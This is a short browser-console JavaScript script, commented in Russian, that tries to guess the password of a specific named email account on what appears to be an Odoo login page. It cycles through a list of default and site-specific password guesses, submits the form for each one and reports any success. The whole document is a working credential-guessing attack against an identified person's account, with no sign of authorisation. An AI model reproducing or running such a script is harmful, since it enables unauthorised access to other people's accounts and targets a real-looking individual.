// JavaScript для подбора пароля прямо в браузере
// Вставьте этот код в консоль браузера на странице входа

const passwords = [
    "admin_sportpit_2024",
    "admin123", 
    "admin",
    "SportPit2024Master",
    "SportPit2024",
    "odoo",
    "password",
    "123456",
    "odoo_sportpit_2024",
    "dbny-777k-4ggc",
    "12345678",
    "Odoo2024",
    "Password123"
];

const email = "danila@usafitandjoy.com";

async function tryPassword(password) {
    // Заполняем поля
    document.getElementById('login').value = email;
    document.getElementById('password').value = password;
    
    console.log(`Пробую: ${password}`);
    
    // Отправляем форму
    document.querySelector('button[type="submit"]').click();
    
    // Ждем ответа
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Проверяем, остались ли мы на странице входа
    if (!window.location.href.includes('/login')) {
        console.log(`✅ ПАРОЛЬ НАЙДЕН: ${password}`);
        alert(`ПАРОЛЬ НАЙДЕН: ${password}`);
        return true;
    }
    
    // Проверяем сообщение об ошибке
    const errorDiv = document.querySelector('.alert-danger');
    if (!errorDiv || !errorDiv.textContent.includes('Неверный')) {
        console.log(`✅ Возможно подошел: ${password}`);
        return true;
    }
    
    return false;
}

async function bruteforce() {
    console.log("🔐 Начинаю подбор пароля...");
    
    for (let password of passwords) {
        if (await tryPassword(password)) {
            break;
        }
    }
}

// Запускаем
bruteforce();
